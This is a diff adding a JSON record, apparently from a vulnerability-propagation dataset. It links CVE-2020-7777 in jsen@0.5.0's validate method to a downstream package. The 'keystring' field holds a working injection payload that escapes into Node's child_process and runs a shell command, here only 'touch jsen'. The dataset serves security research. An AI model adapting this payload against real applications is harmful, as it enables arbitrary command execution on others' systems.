@@ -1,0 +1,10 @@
+{
+  "id": "CVE-2020-7777",
+  "upstream": "jsen@0.5.0",
+  "keymethod": "validate",
+  "keystring": "\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\"",
+  "location": "",
+  "downstreams": [
+    "react-form-controlled@0.9.0"
+  ]
+}
